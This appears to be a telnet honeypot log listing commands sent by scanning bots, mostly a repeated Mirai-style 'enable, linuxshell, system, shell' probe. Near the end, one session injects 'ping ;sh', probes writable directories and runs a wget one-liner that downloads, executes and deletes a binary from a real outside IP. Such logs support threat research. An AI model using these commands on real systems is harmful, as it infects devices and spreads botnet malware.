949,f982bab318ba,2026-08-29 00:46:00,,0,enable 
950,284cb738db43,2026-08-29 00:46:03,,1,enable
951,284cb738db43,2026-08-29 00:46:03,,0,enable 
952,284cb738db43,2026-08-29 00:46:04,,1,linuxshell
953,284cb738db43,2026-08-29 00:46:04,,0,linuxshell 
954,284cb738db43,2026-08-29 00:46:05,,1,system
955,284cb738db43,2026-08-29 00:46:05,,0,system 
956,100b05dbb2a0,2026-08-29 00:46:14,,1,linuxshell
957,100b05dbb2a0,2026-08-29 00:46:14,,0,linuxshell 
958,284cb738db43,2026-08-29 00:47:26,,1,shell
959,284cb738db43,2026-08-29 00:47:26,,0,shell 
960,f982bab318ba,2026-08-29 00:47:28,,1,linuxshell
961,f982bab318ba,2026-08-29 00:47:28,,0,linuxshell 
962,f982bab318ba,2026-08-29 00:47:31,,1,system
963,f982bab318ba,2026-08-29 00:47:31,,0,system 
964,f982bab318ba,2026-08-29 00:48:40,,1,shell
965,f982bab318ba,2026-08-29 00:48:40,,0,shell 
966,93a2b10a3889,2026-08-29 00:48:42,,1,enable
967,93a2b10a3889,2026-08-29 00:48:42,,0,enable 
968,93a2b10a3889,2026-08-29 00:48:42,,1,linuxshell
969,93a2b10a3889,2026-08-29 00:48:42,,0,linuxshell 
970,93a2b10a3889,2026-08-29 00:48:43,,1,system
971,93a2b10a3889,2026-08-29 00:48:43,,0,system 
972,93a2b10a3889,2026-08-29 00:48:43,,1,shell
973,93a2b10a3889,2026-08-29 00:48:43,,0,shell 
974,1b90e4356969,2026-08-29 00:49:25,,1,enable
975,1b90e4356969,2026-08-29 00:49:25,,0,enable 
976,93a2b10a3889,2026-08-29 00:50:05,,1,sh
977,1b90e4356969,2026-08-29 00:50:38,,1,linuxshell
978,1b90e4356969,2026-08-29 00:50:38,,0,linuxshell 
979,f132ce91a22b,2026-08-29 00:51:57,,1,enable
980,f132ce91a22b,2026-08-29 00:51:57,,0,enable 
981,f132ce91a22b,2026-08-29 00:52:36,,1,linuxshell
982,f132ce91a22b,2026-08-29 00:52:36,,0,linuxshell 
983,8946a264f1b7,2026-08-29 00:52:50,,1,enable
984,8946a264f1b7,2026-08-29 00:52:50,,0,enable 
985,8946a264f1b7,2026-08-29 00:52:51,,1,linuxshell
986,8946a264f1b7,2026-08-29 00:52:51,,0,linuxshell 
987,d029aba51ac8,2026-08-29 00:52:51,,1,enable
988,d029aba51ac8,2026-08-29 00:52:51,,0,enable 
989,8946a264f1b7,2026-08-29 00:52:52,,1,system
990,8946a264f1b7,2026-08-29 00:52:52,,0,system 
991,b6b87f5b4245,2026-08-29 00:53:01,,1,enable
992,b6b87f5b4245,2026-08-29 00:53:01,,0,enable 
993,8946a264f1b7,2026-08-29 00:54:06,,1,shell
994,8946a264f1b7,2026-08-29 00:54:06,,0,shell 
995,f132ce91a22b,2026-08-29 00:54:18,,1,system
996,f132ce91a22b,2026-08-29 00:54:18,,0,system 
997,b6b87f5b4245,2026-08-29 00:54:29,,1,linuxshell
998,b6b87f5b4245,2026-08-29 00:54:29,,0,linuxshell 
999,b6b87f5b4245,2026-08-29 00:55:45,,1,system
1000,b6b87f5b4245,2026-08-29 00:55:45,,0,system 
1001,8946a264f1b7,2026-08-29 00:55:49,,1,sh
1002,c339cfb0f00c,2026-08-29 00:56:13,,1,enable
1003,c339cfb0f00c,2026-08-29 00:56:13,,0,enable 
1004,c339cfb0f00c,2026-08-29 00:56:22,,1,linuxshell
1005,c339cfb0f00c,2026-08-29 00:56:22,,0,linuxshell 
1006,a12fb351c26c,2026-08-29 00:56:23,,1,enable
1007,a12fb351c26c,2026-08-29 00:56:23,,0,enable 
1008,215f627d6b02,2026-08-29 00:56:55,,1,enable
1009,215f627d6b02,2026-08-29 00:56:55,,0,enable 
1010,a12fb351c26c,2026-08-29 00:56:57,,1,linuxshell
1011,a12fb351c26c,2026-08-29 00:56:57,,0,linuxshell 
1012,643acfba7128,2026-08-29 00:57:02,,1,system
1013,643acfba7128,2026-08-29 00:57:02,,0,system 
1014,643acfba7128,2026-08-29 00:57:03,,1,shell
1015,643acfba7128,2026-08-29 00:57:03,,0,shell 
1016,643acfba7128,2026-08-29 00:57:04,,1,sh
1017,aa202e1c65c0,2026-08-29 00:57:12,,1,enable
1018,aa202e1c65c0,2026-08-29 00:57:12,,0,enable 
1019,aa202e1c65c0,2026-08-29 00:57:14,,1,linuxshell
1020,aa202e1c65c0,2026-08-29 00:57:14,,0,linuxshell 
1021,e7439fd42c28,2026-08-29 00:57:27,,1,enable
1022,e7439fd42c28,2026-08-29 00:57:27,,0,enable 
1023,c339cfb0f00c,2026-08-29 00:57:44,,1,system
1024,c339cfb0f00c,2026-08-29 00:57:44,,0,system 
1025,643acfba7128,2026-08-29 00:58:09,,1,/bin/busybox UNSTABLE
1026,aeaf7a9d18e4,2026-08-29 00:58:21,,1,enable
1027,aeaf7a9d18e4,2026-08-29 00:58:21,,0,enable 
1028,aeaf7a9d18e4,2026-08-29 00:58:22,,1,linuxshell
1029,aeaf7a9d18e4,2026-08-29 00:58:22,,0,linuxshell 
1030,aeaf7a9d18e4,2026-08-29 00:58:23,,1,system
1031,aeaf7a9d18e4,2026-08-29 00:58:23,,0,system 
1032,a12fb351c26c,2026-08-29 00:58:26,,1,system
1033,a12fb351c26c,2026-08-29 00:58:26,,0,system 
1034,aa202e1c65c0,2026-08-29 00:58:29,,1,system
1035,aa202e1c65c0,2026-08-29 00:58:29,,0,system 
1036,215f627d6b02,2026-08-29 00:58:34,,1,linuxshell
1037,215f627d6b02,2026-08-29 00:58:34,,0,linuxshell 
1038,e7439fd42c28,2026-08-29 00:58:47,,1,linuxshell
1039,e7439fd42c28,2026-08-29 00:58:47,,0,linuxshell 
1040,c339cfb0f00c,2026-08-29 00:58:57,,1,shell
1041,c339cfb0f00c,2026-08-29 00:58:57,,0,shell 
1042,aeaf7a9d18e4,2026-08-29 00:59:04,,1,shell
1043,aeaf7a9d18e4,2026-08-29 00:59:04,,0,shell 
1044,aa202e1c65c0,2026-08-29 00:59:45,,1,shell
1045,aa202e1c65c0,2026-08-29 00:59:45,,0,shell 
1046,aeaf7a9d18e4,2026-08-29 01:00:55,,1,sh
1047,4b8711cd7241,2026-08-29 01:03:11,,1,enable
1048,4b8711cd7241,2026-08-29 01:03:11,,0,enable 
1049,4b8711cd7241,2026-08-29 01:03:12,,1,linuxshell
1050,4b8711cd7241,2026-08-29 01:03:12,,0,linuxshell 
1051,4b8711cd7241,2026-08-29 01:03:43,,1,system
1052,4b8711cd7241,2026-08-29 01:03:43,,0,system 
1053,4b8711cd7241,2026-08-29 01:04:57,,1,shell
1054,4b8711cd7241,2026-08-29 01:04:57,,0,shell 
1055,4b8711cd7241,2026-08-29 01:04:58,,1,sh
1056,4b8711cd7241,2026-08-29 01:04:58,,1,/bin/busybox UNSTABLE
1057,489871f16d24,2026-08-29 01:07:31,,1,enable
1058,489871f16d24,2026-08-29 01:07:31,,0,enable 
1059,489871f16d24,2026-08-29 01:07:32,,1,linuxshell
1060,489871f16d24,2026-08-29 01:07:32,,0,linuxshell 
1061,489871f16d24,2026-08-29 01:07:39,,1,system
1062,489871f16d24,2026-08-29 01:07:39,,0,system 
1063,489871f16d24,2026-08-29 01:08:16,,1,shell
1064,489871f16d24,2026-08-29 01:08:16,,0,shell 
1065,8c0020f2d2c4,2026-08-29 01:08:49,,1,enable
1066,8c0020f2d2c4,2026-08-29 01:08:49,,0,enable 
1067,8c0020f2d2c4,2026-08-29 01:08:49,,1,linuxshell
1068,8c0020f2d2c4,2026-08-29 01:08:49,,0,linuxshell 
1069,8c0020f2d2c4,2026-08-29 01:09:15,,1,system
1070,8c0020f2d2c4,2026-08-29 01:09:15,,0,system 
1071,489871f16d24,2026-08-29 01:10:28,,1,sh
1072,8c0020f2d2c4,2026-08-29 01:10:46,,1,shell
1073,8c0020f2d2c4,2026-08-29 01:10:46,,0,shell 
1074,9635274a3ec3,2026-08-29 01:12:31,,1,enable
1075,9635274a3ec3,2026-08-29 01:12:31,,0,enable 
1076,d88167dd4c4b,2026-08-29 01:12:43,,1,enable
1077,d88167dd4c4b,2026-08-29 01:12:43,,0,enable 
1078,9635274a3ec3,2026-08-29 01:13:13,,1,linuxshell
1079,9635274a3ec3,2026-08-29 01:13:13,,0,linuxshell 
1080,9635274a3ec3,2026-08-29 01:13:15,,1,system
1081,9635274a3ec3,2026-08-29 01:13:15,,0,system 
1082,cf05999ddbd5,2026-08-29 01:14:30,,1,enable
1083,cf05999ddbd5,2026-08-29 01:14:30,,0,enable 
1084,cf05999ddbd5,2026-08-29 01:15:52,,1,linuxshell
1085,cf05999ddbd5,2026-08-29 01:15:52,,0,linuxshell 
1086,845febd37eb5,2026-08-29 01:17:34,,1,system
1087,845febd37eb5,2026-08-29 01:17:34,,0,system 
1088,dbf6b5a47249,2026-08-29 01:17:35,,1,enable
1089,dbf6b5a47249,2026-08-29 01:17:35,,0,enable 
1090,dbf6b5a47249,2026-08-29 01:18:18,,1,linuxshell
1091,dbf6b5a47249,2026-08-29 01:18:18,,0,linuxshell 
1092,dbf6b5a47249,2026-08-29 01:18:18,,1,system
1093,dbf6b5a47249,2026-08-29 01:18:18,,0,system 
1094,dbf6b5a47249,2026-08-29 01:18:18,,1,shell
1095,dbf6b5a47249,2026-08-29 01:18:18,,0,shell 
1096,dbf6b5a47249,2026-08-29 01:18:19,,1,sh
1097,dbf6b5a47249,2026-08-29 01:18:19,,1,/bin/busybox UNSTABLE
1098,c184e964fde9,2026-08-29 01:18:34,,1,enable
1099,c184e964fde9,2026-08-29 01:18:34,,0,enable 
1100,845febd37eb5,2026-08-29 01:18:48,,1,shell
1101,845febd37eb5,2026-08-29 01:18:48,,0,shell 
1102,3c7559154420,2026-08-29 01:19:34,,1,enable
1103,3c7559154420,2026-08-29 01:19:34,,0,enable 
1104,3c7559154420,2026-08-29 01:19:34,,1,linuxshell
1105,3c7559154420,2026-08-29 01:19:34,,0,linuxshell 
1106,57d804533a4f,2026-08-29 01:19:52,,1,enable
1107,57d804533a4f,2026-08-29 01:19:52,,0,enable 
1108,57d804533a4f,2026-08-29 01:19:52,,1,linuxshell
1109,57d804533a4f,2026-08-29 01:19:52,,0,linuxshell 
1110,c184e964fde9,2026-08-29 01:19:53,,1,linuxshell
1111,c184e964fde9,2026-08-29 01:19:53,,0,linuxshell 
1112,57d804533a4f,2026-08-29 01:19:56,,1,system
1113,57d804533a4f,2026-08-29 01:19:56,,0,system 
1114,3c7559154420,2026-08-29 01:19:57,,1,system
1115,3c7559154420,2026-08-29 01:19:57,,0,system 
1116,57d804533a4f,2026-08-29 01:20:34,,1,shell
1117,57d804533a4f,2026-08-29 01:20:34,,0,shell 
1118,3c7559154420,2026-08-29 01:21:53,,1,shell
1119,3c7559154420,2026-08-29 01:21:53,,0,shell 
1120,2b32505f5339,2026-08-29 01:23:50,,1,enable
1121,2b32505f5339,2026-08-29 01:23:50,,0,enable 
1122,2b32505f5339,2026-08-29 01:23:52,,1,linuxshell
1123,2b32505f5339,2026-08-29 01:23:52,,0,linuxshell 
1124,2b32505f5339,2026-08-29 01:23:53,,1,system
1125,2b32505f5339,2026-08-29 01:23:53,,0,system 
1126,2b32505f5339,2026-08-29 01:23:54,,1,shell
1127,2b32505f5339,2026-08-29 01:23:54,,0,shell 
1128,2b32505f5339,2026-08-29 01:24:37,,1,sh
1129,65e1b588e34c,2026-08-29 01:25:30,,1,enable
1130,65e1b588e34c,2026-08-29 01:25:30,,0,enable 
1131,65e1b588e34c,2026-08-29 01:25:30,,1,linuxshell
1132,65e1b588e34c,2026-08-29 01:25:30,,0,linuxshell 
1133,65e1b588e34c,2026-08-29 01:26:47,,1,system
1134,65e1b588e34c,2026-08-29 01:26:47,,0,system 
1135,b1afee0b3a5c,2026-08-29 01:27:05,,1,enable
1136,b1afee0b3a5c,2026-08-29 01:27:05,,0,enable 
1137,429d98a99437,2026-08-29 01:27:14,,1,enable
1138,429d98a99437,2026-08-29 01:27:14,,0,enable 
1139,ebf1d42ab5d9,2026-08-29 01:27:15,,1,enable
1140,ebf1d42ab5d9,2026-08-29 01:27:15,,0,enable 
1141,8c8f1ced7d23,2026-08-29 01:27:49,,1,enable
1142,8c8f1ced7d23,2026-08-29 01:27:49,,0,enable 
1143,65e1b588e34c,2026-08-29 01:28:04,,1,shell
1144,65e1b588e34c,2026-08-29 01:28:04,,0,shell 
1145,65e1b588e34c,2026-08-29 01:28:15,,1,sh
1146,b1afee0b3a5c,2026-08-29 01:28:23,,1,linuxshell
1147,b1afee0b3a5c,2026-08-29 01:28:23,,0,linuxshell 
1148,ae73da546d30,2026-08-29 01:28:36,,1,enable
1149,ae73da546d30,2026-08-29 01:28:36,,0,enable 
1150,429d98a99437,2026-08-29 01:28:37,,1,linuxshell
1151,429d98a99437,2026-08-29 01:28:37,,0,linuxshell 
1152,d426e9e7a7e1,2026-08-29 01:28:38,,1,enable
1153,d426e9e7a7e1,2026-08-29 01:28:38,,0,enable 
1154,ac043c620640,2026-08-29 01:28:55,,1,enable
1155,ac043c620640,2026-08-29 01:28:55,,0,enable 
1156,ac043c620640,2026-08-29 01:28:55,,1,linuxshell
1157,ac043c620640,2026-08-29 01:28:55,,0,linuxshell 
1158,8c8f1ced7d23,2026-08-29 01:29:05,,1,linuxshell
1159,8c8f1ced7d23,2026-08-29 01:29:05,,0,linuxshell 
1160,1a92b67b1395,2026-08-29 01:29:46,,1,enable
1161,1a92b67b1395,2026-08-29 01:29:46,,0,enable 
1162,ae73da546d30,2026-08-29 01:29:51,,1,linuxshell
1163,ae73da546d30,2026-08-29 01:29:51,,0,linuxshell 
1164,ac043c620640,2026-08-29 01:29:56,,1,system
1165,ac043c620640,2026-08-29 01:29:56,,0,system 
1166,69ec26f43f15,2026-08-29 01:30:14,,1,enable
1167,69ec26f43f15,2026-08-29 01:30:14,,0,enable 
1168,69ec26f43f15,2026-08-29 01:30:15,,1,linuxshell
1169,69ec26f43f15,2026-08-29 01:30:15,,0,linuxshell 
1170,69ec26f43f15,2026-08-29 01:30:18,,1,system
1171,69ec26f43f15,2026-08-29 01:30:18,,0,system 
1172,dd96cb8918a3,2026-08-29 01:30:30,,1,enable
1173,dd96cb8918a3,2026-08-29 01:30:30,,0,enable 
1174,dd96cb8918a3,2026-08-29 01:30:30,,1,linuxshell
1175,dd96cb8918a3,2026-08-29 01:30:30,,0,linuxshell 
1176,dd96cb8918a3,2026-08-29 01:30:31,,1,system
1177,dd96cb8918a3,2026-08-29 01:30:31,,0,system 
1178,dd96cb8918a3,2026-08-29 01:30:31,,1,shell
1179,dd96cb8918a3,2026-08-29 01:30:31,,0,shell 
1180,92c0f56349ea,2026-08-29 01:31:00,,1,enable
1181,92c0f56349ea,2026-08-29 01:31:00,,0,enable 
1182,69ec26f43f15,2026-08-29 01:31:10,,1,shell
1183,69ec26f43f15,2026-08-29 01:31:10,,0,shell 
1184,ac043c620640,2026-08-29 01:31:13,,1,shell
1185,ac043c620640,2026-08-29 01:31:13,,0,shell 
1186,0ee30f0e7cdd,2026-08-29 01:31:31,,1,enable
1187,0ee30f0e7cdd,2026-08-29 01:31:31,,0,enable 
1188,dd96cb8918a3,2026-08-29 01:31:35,,1,sh
1189,dd96cb8918a3,2026-08-29 01:32:43,,1,/bin/busybox UNSTABLE
1190,0ee30f0e7cdd,2026-08-29 01:32:58,,1,linuxshell
1191,0ee30f0e7cdd,2026-08-29 01:32:58,,0,linuxshell 
1192,b2f4a14a83ab,2026-08-29 01:33:18,,1,enable
1193,b2f4a14a83ab,2026-08-29 01:33:18,,0,enable 
1194,b2f4a14a83ab,2026-08-29 01:33:18,,1,linuxshell
1195,b2f4a14a83ab,2026-08-29 01:33:18,,0,linuxshell 
1196,b2f4a14a83ab,2026-08-29 01:33:19,,1,system
1197,b2f4a14a83ab,2026-08-29 01:33:19,,0,system 
1198,b2f4a14a83ab,2026-08-29 01:33:19,,1,shell
1199,b2f4a14a83ab,2026-08-29 01:33:19,,0,shell 
1200,b2f4a14a83ab,2026-08-29 01:33:59,,1,sh
1201,b2f4a14a83ab,2026-08-29 01:34:20,,1,/bin/busybox UNSTABLE
1202,937b46eead42,2026-08-29 01:34:36,,1,enable
1203,937b46eead42,2026-08-29 01:34:36,,0,enable 
1204,dc8237d3d7c7,2026-08-29 01:34:44,,1,enable
1205,dc8237d3d7c7,2026-08-29 01:34:44,,0,enable 
1206,6b91bb12c5f8,2026-08-29 01:35:17,,1,enable
1207,6b91bb12c5f8,2026-08-29 01:35:17,,0,enable 
1208,6b91bb12c5f8,2026-08-29 01:35:27,,1,linuxshell
1209,6b91bb12c5f8,2026-08-29 01:35:27,,0,linuxshell 
1210,dc8237d3d7c7,2026-08-29 01:36:08,,1,linuxshell
1211,dc8237d3d7c7,2026-08-29 01:36:08,,0,linuxshell 
1212,48b42a3f62a0,2026-08-29 01:38:04,,1,enable
1213,48b42a3f62a0,2026-08-29 01:38:04,,0,enable 
1214,61743977fb86,2026-08-29 01:38:40,,1,enable
1215,61743977fb86,2026-08-29 01:38:40,,0,enable 
1216,48b42a3f62a0,2026-08-29 01:38:42,,1,linuxshell
1217,48b42a3f62a0,2026-08-29 01:38:42,,0,linuxshell 
1218,48b42a3f62a0,2026-08-29 01:39:24,,1,system
1219,48b42a3f62a0,2026-08-29 01:39:24,,0,system 
1220,7aec7404c3ae,2026-08-29 01:40:39,,1,enable
1221,7aec7404c3ae,2026-08-29 01:40:39,,0,enable 
1222,bdfb1cd7e538,2026-08-29 01:41:38,,1,enable
1223,bdfb1cd7e538,2026-08-29 01:41:38,,0,enable 
1224,7aec7404c3ae,2026-08-29 01:41:39,,1,linuxshell
1225,7aec7404c3ae,2026-08-29 01:41:39,,0,linuxshell 
1226,b7ee489a38d7,2026-08-29 01:42:13,,1,enable
1227,b7ee489a38d7,2026-08-29 01:42:13,,0,enable 
1228,b7ee489a38d7,2026-08-29 01:42:14,,1,linuxshell
1229,b7ee489a38d7,2026-08-29 01:42:14,,0,linuxshell 
1230,b7ee489a38d7,2026-08-29 01:42:14,,1,system
1231,b7ee489a38d7,2026-08-29 01:42:14,,0,system 
1232,bdfb1cd7e538,2026-08-29 01:42:17,,1,linuxshell
1233,bdfb1cd7e538,2026-08-29 01:42:17,,0,linuxshell 
1234,bdfb1cd7e538,2026-08-29 01:42:21,,1,system
1235,bdfb1cd7e538,2026-08-29 01:42:21,,0,system 
1236,b7ee489a38d7,2026-08-29 01:42:51,,1,shell
1237,b7ee489a38d7,2026-08-29 01:42:51,,0,shell 
1238,7c46dcbbf2aa,2026-08-29 01:42:52,,1,enable
1239,7c46dcbbf2aa,2026-08-29 01:42:52,,0,enable 
1240,7c46dcbbf2aa,2026-08-29 01:44:10,,1,linuxshell
1241,7c46dcbbf2aa,2026-08-29 01:44:10,,0,linuxshell 
1242,0304cda0d4a7,2026-08-29 01:44:16,,1,enable
1243,0304cda0d4a7,2026-08-29 01:44:16,,0,enable 
1244,b7ee489a38d7,2026-08-29 01:44:50,,1,sh
1245,6a041bf2dcc2,2026-08-29 01:45:19,,1,enable
1246,6a041bf2dcc2,2026-08-29 01:45:19,,0,enable 
1247,6a041bf2dcc2,2026-08-29 01:45:19,,1,linuxshell
1248,6a041bf2dcc2,2026-08-29 01:45:19,,0,linuxshell 
1249,0304cda0d4a7,2026-08-29 01:45:35,,1,linuxshell
1250,0304cda0d4a7,2026-08-29 01:45:35,,0,linuxshell 
1251,6a041bf2dcc2,2026-08-29 01:46:37,,1,system
1252,6a041bf2dcc2,2026-08-29 01:46:37,,0,system 
1253,6a041bf2dcc2,2026-08-29 01:47:24,,1,shell
1254,6a041bf2dcc2,2026-08-29 01:47:24,,0,shell 
1255,2fa57d8617d3,2026-08-29 01:47:28,,1,enable
1256,2fa57d8617d3,2026-08-29 01:47:28,,0,enable 
1257,6a041bf2dcc2,2026-08-29 01:48:16,,1,sh
1258,299f3595d45c,2026-08-29 01:48:21,,1,enable
1259,299f3595d45c,2026-08-29 01:48:21,,0,enable 
1260,2fa57d8617d3,2026-08-29 01:48:42,,1,linuxshell
1261,2fa57d8617d3,2026-08-29 01:48:42,,0,linuxshell 
1262,78b56d5aa970,2026-08-29 01:49:10,,1,enable
1263,78b56d5aa970,2026-08-29 01:49:10,,0,enable 
1264,78b56d5aa970,2026-08-29 01:49:10,,1,linuxshell
1265,78b56d5aa970,2026-08-29 01:49:10,,0,linuxshell 
1266,78b56d5aa970,2026-08-29 01:49:11,,1,system
1267,78b56d5aa970,2026-08-29 01:49:11,,0,system 
1268,299f3595d45c,2026-08-29 01:49:12,,1,linuxshell
1269,299f3595d45c,2026-08-29 01:49:12,,0,linuxshell 
1270,d0110a2488f6,2026-08-29 01:49:48,,1,enable
1271,d0110a2488f6,2026-08-29 01:49:48,,0,enable 
1272,78b56d5aa970,2026-08-29 01:50:30,,1,shell
1273,78b56d5aa970,2026-08-29 01:50:30,,0,shell 
1274,1c5121848707,2026-08-29 01:50:33,,1,enable
1275,1c5121848707,2026-08-29 01:50:33,,0,enable 
1276,1c5121848707,2026-08-29 01:50:34,,1,linuxshell
1277,1c5121848707,2026-08-29 01:50:34,,0,linuxshell 
1278,d0110a2488f6,2026-08-29 01:50:54,,1,linuxshell
1279,d0110a2488f6,2026-08-29 01:50:54,,0,linuxshell 
1280,1c5121848707,2026-08-29 01:51:11,,1,system
1281,1c5121848707,2026-08-29 01:51:11,,0,system 
1282,1c5121848707,2026-08-29 01:51:12,,1,shell
1283,1c5121848707,2026-08-29 01:51:12,,0,shell 
1284,1c5121848707,2026-08-29 01:51:12,,1,sh
1285,1c5121848707,2026-08-29 01:51:44,,1,/bin/busybox UNSTABLE
1286,78b56d5aa970,2026-08-29 01:51:48,,1,sh
1287,d0110a2488f6,2026-08-29 01:52:00,,1,system
1288,d0110a2488f6,2026-08-29 01:52:00,,0,system 
1289,d0110a2488f6,2026-08-29 01:52:09,,1,shell
1290,d0110a2488f6,2026-08-29 01:52:09,,0,shell 
1291,98b912a4f2bd,2026-08-29 01:52:35,,1,enable
1292,98b912a4f2bd,2026-08-29 01:52:35,,0,enable 
1293,2bd446814d0b,2026-08-29 01:57:13,,1,enable
1294,2bd446814d0b,2026-08-29 01:57:13,,0,enable 
1295,2bd446814d0b,2026-08-29 01:57:14,,1,linuxshell
1296,2bd446814d0b,2026-08-29 01:57:14,,0,linuxshell 
1297,2bd446814d0b,2026-08-29 01:57:14,,1,system
1298,2bd446814d0b,2026-08-29 01:57:14,,0,system 
1299,2bd446814d0b,2026-08-29 01:57:15,,1,shell
1300,2bd446814d0b,2026-08-29 01:57:15,,0,shell 
1301,2bd446814d0b,2026-08-29 01:57:15,,1,sh
1302,2bd446814d0b,2026-08-29 01:58:17,,1,/bin/busybox UNSTABLE
1303,b147cae972bf,2026-08-29 02:02:12,,1,system
1304,b147cae972bf,2026-08-29 02:02:12,,0,system 
1305,facfa30df51d,2026-08-29 02:02:30,,1,enable
1306,facfa30df51d,2026-08-29 02:02:30,,0,enable 
1307,5709b41d2d0f,2026-08-29 02:03:36,,1,enable
1308,5709b41d2d0f,2026-08-29 02:03:36,,0,enable 
1309,facfa30df51d,2026-08-29 02:03:47,,1,linuxshell
1310,facfa30df51d,2026-08-29 02:03:47,,0,linuxshell 
1311,ff7ec486dfcd,2026-08-29 02:03:48,,1,enable
1312,ff7ec486dfcd,2026-08-29 02:03:48,,0,enable 
1313,d86805838ae3,2026-08-29 02:04:03,,1,enable
1314,d86805838ae3,2026-08-29 02:04:03,,0,enable 
1315,d86805838ae3,2026-08-29 02:04:20,,1,linuxshell
1316,d86805838ae3,2026-08-29 02:04:20,,0,linuxshell 
1317,f3b6cdad4bac,2026-08-29 02:04:39,,1,enable
1318,f3b6cdad4bac,2026-08-29 02:04:39,,0,enable 
1319,f3b6cdad4bac,2026-08-29 02:04:39,,1,linuxshell
1320,f3b6cdad4bac,2026-08-29 02:04:39,,0,linuxshell 
1321,f3b6cdad4bac,2026-08-29 02:04:40,,1,system
1322,f3b6cdad4bac,2026-08-29 02:04:40,,0,system 
1323,f3b6cdad4bac,2026-08-29 02:04:40,,1,shell
1324,f3b6cdad4bac,2026-08-29 02:04:40,,0,shell 
1325,f3b6cdad4bac,2026-08-29 02:04:40,,1,sh
1326,d86805838ae3,2026-08-29 02:05:23,,1,system
1327,d86805838ae3,2026-08-29 02:05:23,,0,system 
1328,0945ebda74ee,2026-08-29 02:05:40,,1,enable
1329,0945ebda74ee,2026-08-29 02:05:40,,0,enable 
1330,ff7ec486dfcd,2026-08-29 02:05:40,,1,linuxshell
1331,ff7ec486dfcd,2026-08-29 02:05:40,,0,linuxshell 
1332,f3b6cdad4bac,2026-08-29 02:05:44,,1,/bin/busybox UNSTABLE
1333,0945ebda74ee,2026-08-29 02:06:24,,1,linuxshell
1334,0945ebda74ee,2026-08-29 02:06:24,,0,linuxshell 
1335,4d6cf95be346,2026-08-29 02:06:25,,1,enable
1336,4d6cf95be346,2026-08-29 02:06:25,,0,enable 
1337,4d6cf95be346,2026-08-29 02:06:38,,1,linuxshell
1338,4d6cf95be346,2026-08-29 02:06:38,,0,linuxshell 
1339,a62197a8da52,2026-08-29 02:06:54,,1,enable
1340,a62197a8da52,2026-08-29 02:06:54,,0,enable 
1341,66a2aae5e584,2026-08-29 02:07:05,,1,enable
1342,66a2aae5e584,2026-08-29 02:07:05,,0,enable 
1343,a62197a8da52,2026-08-29 02:08:11,,1,linuxshell
1344,a62197a8da52,2026-08-29 02:08:11,,0,linuxshell 
1345,7dc35700cdbd,2026-08-29 02:08:36,,1,enable
1346,7dc35700cdbd,2026-08-29 02:08:36,,0,enable 
1347,66a2aae5e584,2026-08-29 02:08:49,,1,linuxshell
1348,66a2aae5e584,2026-08-29 02:08:49,,0,linuxshell 
1349,7dc35700cdbd,2026-08-29 02:09:12,,1,linuxshell
1350,7dc35700cdbd,2026-08-29 02:09:12,,0,linuxshell 
1351,7dc35700cdbd,2026-08-29 02:09:52,,1,system
1352,7dc35700cdbd,2026-08-29 02:09:52,,0,system 
1353,7dc35700cdbd,2026-08-29 02:09:52,,1,shell
1354,7dc35700cdbd,2026-08-29 02:09:52,,0,shell 
1355,7dc35700cdbd,2026-08-29 02:09:54,,1,sh
1356,7dc35700cdbd,2026-08-29 02:10:26,,1,/bin/busybox UNSTABLE
1357,358133d8bca1,2026-08-29 02:10:29,,1,enable
1358,358133d8bca1,2026-08-29 02:10:29,,0,enable 
1359,8a96ab9c7adf,2026-08-29 02:10:53,,1,enable
1360,8a96ab9c7adf,2026-08-29 02:10:53,,0,enable 
1361,8a96ab9c7adf,2026-08-29 02:10:53,,1,system
1362,8a96ab9c7adf,2026-08-29 02:10:53,,0,system 
1363,8a96ab9c7adf,2026-08-29 02:10:53,,1,shell
1364,8a96ab9c7adf,2026-08-29 02:10:53,,0,shell 
1365,8a96ab9c7adf,2026-08-29 02:10:53,,1,sh
1366,8a96ab9c7adf,2026-08-29 02:10:53,,1,linuxshell
1367,8a96ab9c7adf,2026-08-29 02:10:53,,0,linuxshell 
1368,8a96ab9c7adf,2026-08-29 02:10:53,,1,enablelinuxshell
1369,8a96ab9c7adf,2026-08-29 02:10:53,,0,enablelinuxshell 
1370,8a96ab9c7adf,2026-08-29 02:10:53,,1,ping ;sh
1371,8a96ab9c7adf,2026-08-29 02:10:54,,1,busybox
1372,8a96ab9c7adf,2026-08-29 02:10:56,,1,cd /proc && cat self/cmdline
1373,8a96ab9c7adf,2026-08-29 02:10:56,,1,/bin/busybox
1374,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/
1375,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/var/d && chmod 777 /var/d && /var/d && cd /var/
1376,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/
1377,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/
1378,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/
1379,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/
1380,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/data/d && chmod 777 /data/d && /data/d && cd /data/
1381,8a96ab9c7adf,2026-08-29 02:10:57,,0,/data/d 
1382,8a96ab9c7adf,2026-08-29 02:10:57,,1,>/etc/d && chmod 777 /etc/d && /etc/d && cd /etc/
1383,8a96ab9c7adf,2026-08-29 02:10:58,,1,>/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/
1384,8a96ab9c7adf,2026-08-29 02:10:58,,1,>/usr/d && chmod 777 /usr/d && /usr/d && cd /usr/
1385,8a96ab9c7adf,2026-08-29 02:10:58,,1,>/home/d && chmod 777 /home/d && /home/d && cd /home/
1386,8a96ab9c7adf,2026-08-29 02:10:58,,1,>/root/d && chmod 777 /root/d && /root/d && cd /root/
1387,8a96ab9c7adf,2026-08-29 02:10:58,,1,/bin/busybox
1388,8a96ab9c7adf,2026-08-29 02:10:58,,1,(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w
1389,8a96ab9c7adf,2026-08-29 02:10:58,,1,/bin/busybox
1390,8a96ab9c7adf,2026-08-29 02:10:58,,0,./w 
1391,3d4ec432cbb1,2026-08-29 02:10:59,,1,enable
1392,3d4ec432cbb1,2026-08-29 02:10:59,,0,enable 
1393,3d4ec432cbb1,2026-08-29 02:10:59,,1,system
